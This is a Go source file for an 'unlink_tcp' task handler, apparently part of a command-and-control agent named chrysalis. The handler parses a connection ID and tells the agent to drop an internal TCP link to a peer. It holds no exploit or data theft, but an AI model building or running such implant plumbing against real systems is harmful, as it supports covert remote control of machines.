package unlink_tcp

import (
	// Standard

	"encoding/json"

	// src

	"github.com/FractalKnight/chrysalis/src/pkg/utils/structs"
)

type Arguments struct {
	RemoteUUID string `json:"connection"`
}

// Run - package function to run unlink_tcp
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := &Arguments{}
	err := json.Unmarshal([]byte(task.Params), args)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	task.Job.RemoveInternalTCPConnectionChannel <- args.RemoteUUID

	msg.UserOutput = "Tasked to disconnect"
	msg.Completed = true
	msg.Status = "completed"
	task.Job.SendResponses <- msg
	return
}
